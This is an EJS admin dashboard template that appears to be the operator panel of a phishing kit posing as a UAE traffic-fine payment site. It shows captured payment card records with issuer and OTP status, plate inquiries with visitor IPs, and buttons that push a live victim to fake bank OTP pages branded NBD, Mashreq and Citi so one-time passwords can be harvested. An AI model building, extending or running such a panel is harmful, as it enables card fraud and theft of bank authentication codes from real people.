<%- include('_layout', { pageTitle: 'Dashboard', activePage: 'dashboard', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error">Database error: <%= dbError %></div>
<% } else { %>

<div class="stat-grid">
  <div class="stat-card c-blue">
    <div class="stat-label">Total Inquiries</div>
    <div class="stat-value"><%= Number(totalInquiries).toLocaleString() %></div>
    <div class="stat-sub">Today: +<%= todayInquiries %></div>
  </div>
  <div class="stat-card c-amber">
    <div class="stat-label">Total Payments</div>
    <div class="stat-value"><%= Number(totalPayments).toLocaleString() %></div>
    <div class="stat-sub">Today: +<%= todayPayments %></div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Pending OTP</div>
    <div class="stat-value" style="color:#b45309;"><%= Number(pendingPayments).toLocaleString() %></div>
    <div class="stat-sub">Approved: <%= approvedPayments %></div>
  </div>
  <div class="stat-card c-green">
    <div class="stat-label">Total Revenue</div>
    <div class="stat-value">AED <%= Number(totalRevenue).toLocaleString() %></div>
    <div class="stat-sub">All payments</div>
  </div>
</div>

<!-- Recent Payments -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Recent Payments</div>
    <a href="/admin/payments" class="btn btn-ghost btn-sm">View all</a>
  </div>
  <div style="overflow-x:auto;">
  <table>
    <thead>
      <tr>
        <th>Date</th><th>Plate</th><th>Amount</th><th>Card</th><th>Issuer</th><th>OTP Page</th><th>Status</th><th>Actions</th>
      </tr>
    </thead>
    <tbody>
    <% if (recentPayments.length === 0) { %>
    <tr><td colspan="8" style="text-align:center;padding:32px;color:#94a3b8;">No payment records found.</td></tr>
    <% } %>
    <% recentPayments.forEach(function(p) {
      const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
      const last4 = (p.card_number||'').replace(/\s/g,'').slice(-4) || '????';
      const dt = p.created_at ? new Date(p.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}) : '-';
    %>
    <tr>
      <td class="small muted nowrap"><%= dt %></td>
      <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
      <td class="text-green">AED <%= Number(p.total_fine).toLocaleString() %></td>
      <td class="mono">****<%= last4 %></td>
      <td class="small"><%= p.card_issuer || '—' %></td>
      <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
      <td><span class="badge <%= sc %>"><%= p.otp_status %></span></td>
      <td>
        <div class="action-bar">
          <button class="btn btn-sm btn-blue"   onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
          <button class="btn btn-sm btn-purple"  onclick="redirect('<%= p.sid %>','otp')">NBD</button>
          <button class="btn btn-sm btn-amber"   onclick="redirect('<%= p.sid %>','otp-mashreq')">Mashreq</button>
          <button class="btn btn-sm btn-ghost"   onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
        </div>
      </td>
    </tr>
    <% }) %>
    </tbody>
  </table>
  </div>
</div>

<!-- Recent Inquiries -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Recent Plate Inquiries</div>
    <a href="/admin/inquiries" class="btn btn-ghost btn-sm">View all</a>
  </div>
  <div style="overflow-x:auto;">
  <table>
    <thead>
      <tr><th>Date</th><th>Plate</th><th>Fines</th><th>Total AED</th><th>IP</th></tr>
    </thead>
    <tbody>
    <% if (recentInquiries.length === 0) { %>
    <tr><td colspan="5" style="text-align:center;padding:32px;color:#94a3b8;">No inquiry records found.</td></tr>
    <% } %>
    <% recentInquiries.forEach(function(i) {
      const dt = i.created_at ? new Date(i.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}) : '-';
    %>
    <tr>
      <td class="small muted nowrap"><%= dt %></td>
      <td><strong><%= i.plate_src %></strong> <%= i.plate_code %> <%= i.plate_no %></td>
      <td>
        <% if (i.fine_count > 0) { %><strong style="color:#dc2626"><%= i.fine_count %></strong><% } else { %><span class="muted">0</span><% } %>
      </td>
      <td>
        <% if (i.total_amount > 0) { %>AED <%= Number(i.total_amount).toLocaleString() %><% } else { %><span class="muted">—</span><% } %>
      </td>
      <td class="mono muted small"><%= i.ip || '—' %></td>
    </tr>
    <% }) %>
    </tbody>
  </table>
  </div>
</div>

<% } %>

<script>
function redirect(sid, page) {
  if (!confirm('Redirect user to ' + page + '?\n(User must be active on an OTP page.)')) return;
  adminAction({ act: 'redirect', sid, page });
}
</script>

<%- include('_layout_end') %>
